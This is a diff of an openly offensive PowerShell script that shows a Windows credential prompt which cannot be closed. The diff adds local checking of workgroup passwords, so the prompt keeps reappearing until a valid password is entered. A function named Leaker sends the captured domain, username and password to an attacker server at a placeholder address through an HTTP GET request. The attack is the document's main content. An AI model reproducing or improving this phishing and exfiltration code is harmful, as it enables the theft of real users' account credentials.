@@ -10,6 +10,7 @@ The box cannot be closed (only by killing the process) and it keeps checking the
 
 # Prerequisites
 Add-Type -AssemblyName System.Runtime.WindowsRuntime
+Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
 [Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
 [Windows.Security.Credentials.UI.CredentialPickerResults,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
@@ -18,6 +19,7 @@ $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.
 #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $CurrentDomain_Name = $env:USERDOMAIN
+$ComputerName = $env:COMPUTERNAME
 
 # For our While loop
 $status = $true
@@ -41,7 +43,7 @@ function Await($WinRtTask, $ResultType) {
 
 function Leaker($domain,$username,$password){
     try{
-        Invoke-WebRequest http://192.168.116.1:8000/$domain";"$username";"$password -Method GET -ErrorAction Ignore
+        Invoke-WebRequest http://Server_IP:PORT/$domain";"$username";"$password -Method GET -ErrorAction Ignore
         }
     catch{}
     }
@@ -62,9 +64,15 @@ function Credentials(){
             $Password = $creds.CredentialPassword;
             if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain -eq $false -and ((Get-WmiObject -Class Win32_ComputerSystem).Workgroup -eq "WORKGROUP") -or (Get-WmiObject -Class Win32_ComputerSystem).Workgroup -ne $null){
                 $domain = "WORKGROUP"
-                Leaker($domain,$Username,$Password) 
-                $status = $false
-                exit
+                $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
+                if ($workgroup_creds.ValidateCredentials($UserName, $Password) -ne $null){
+                    Leaker($domain,$Username,$Password)
+                    $status = $false
+                    exit
+                    }
+                else {
+                    Credentials
+                    }                
                 }
 
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
